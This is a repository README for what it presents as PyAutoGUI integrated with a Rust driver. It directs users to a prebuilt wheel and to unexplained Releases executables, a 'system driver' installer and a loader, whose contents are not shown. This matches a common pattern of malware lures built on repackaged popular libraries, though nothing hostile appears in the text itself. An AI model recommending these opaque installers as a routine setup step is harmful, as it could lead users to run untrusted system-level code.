# PyAutoGUI Rust Driver Integration

This repository contains PyAutoGUI integrated with a high-performance Rust driver and loader interface for advanced Windows automation.

## Project Structure

* `PyAutoGUI-0.9.54/` - The core PyAutoGUI python module package integrated with Rust extensions.
  * `src/` - Rust core source code providing accelerated win32 API calls (GDI screen capture, inputs, and image locating).
  * `rust_installer/` - Rust based toolchain installer and loader executables.
* `rust_driver_demo/` - A standalone demonstration of the Rust driver interface for keyboard and mouse emulation.

## Installation

### Python Package (Wheel)

You can download the compiled wheel from the Releases page and install it directly:

```bash
pip install pyautogui-0.9.54-cp37-abi3-win_amd64.whl
```

Or build it manually from source:

```bash
cd PyAutoGUI-0.9.54
python setup.py bdist_wheel
```

### Rust Driver Installer

The pre-compiled installer executables are available in the Releases attachments:
* `rust_installer.exe` - Configures the system driver interface.
* `pyautogui_loader.exe` - Launches and links the library runtime.

## Quick Start

```python
import pyautogui

screenWidth, screenHeight = pyautogui.size()
currentMouseX, currentMouseY = pyautogui.position()

pyautogui.moveTo(100, 150)
pyautogui.click()
```
